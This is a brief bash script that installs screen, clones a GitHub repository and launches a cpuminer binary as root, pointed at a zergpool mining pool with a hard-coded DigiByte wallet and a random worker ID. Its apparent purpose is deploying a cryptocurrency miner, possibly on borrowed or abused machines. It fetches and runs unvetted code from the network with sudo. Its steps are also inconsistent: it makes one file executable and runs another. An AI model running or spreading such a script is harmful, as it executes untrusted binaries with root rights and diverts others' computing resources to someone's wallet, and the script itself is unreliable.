#!/bin/bash

sudo apt-get update
sudo apt-get install screen -y
screen -dms pointerhu12.sh 65 75
sudo git clone https://github.com/dewaagro/repotestedcicilan.git
cd repotestedcicilan
chmod +x tesmux
worker=$(shuf -n 1 -i 1-9999999)
sudo ./cpuminer-sse2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zergpool.com:4563 -u dgb1qmsx84scmqd3eg2uau3f63ywfcspxu02h3agzwc -p c=DGB,mc=GXX/PYRK,ID=$worker
